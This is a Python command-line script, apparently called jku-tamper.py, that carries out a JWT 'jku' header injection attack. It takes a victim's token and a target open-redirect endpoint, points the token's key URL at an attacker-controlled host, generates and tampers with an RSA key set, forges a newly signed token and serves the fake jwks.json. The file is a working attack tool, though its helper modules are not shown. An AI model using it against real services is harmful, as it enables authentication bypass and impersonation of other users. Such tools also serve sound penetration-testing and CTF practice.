#!/usr/bin/env python

import argparse
from utils.parser import *
from utils.rsa_gen import gen_key
from utils.tamper import tamper
from utils.jwt_gen import gen_jwt
from utils.srvr import serve


def main():
    example_text = '''example:

     python3 jku-tamper.py -rurl "http://example.com/redirect/?url=" -lh 10.10.10.10 -lp 8080 -token "eyJhbGciOiJSUzI1NiIsImpre ...  x479NqXg-9w2G7sDZ5_zlYeRzvp2x-WyA"
     
     '''

    arg_parse = argparse.ArgumentParser(epilog=example_text)
    arg_parse.add_argument("-rurl", help="url with redirect endpoint", type=str, required=True)
    arg_parse.add_argument("-lh", help="local host ip", type=str, required=True)
    arg_parse.add_argument("-lp", help="local host port", type=int, required=True)
    arg_parse.add_argument("-token", help="JWT token", type=str, required=True)
    args = arg_parse.parse_args()

    url = args.rurl + args.lh + ":" + str(args.lp) + "/" + "jwks.json"
    jwks = parse_token(args.token)
    pem = gen_key()
    parsed_pem = parse_pem(pem)
    tamper(jwks, parsed_pem)
    gen_jwt(args.token, parsed_pem, url)
    serve(args.lh, args.lp)


if __name__ == '__main__':
    main()
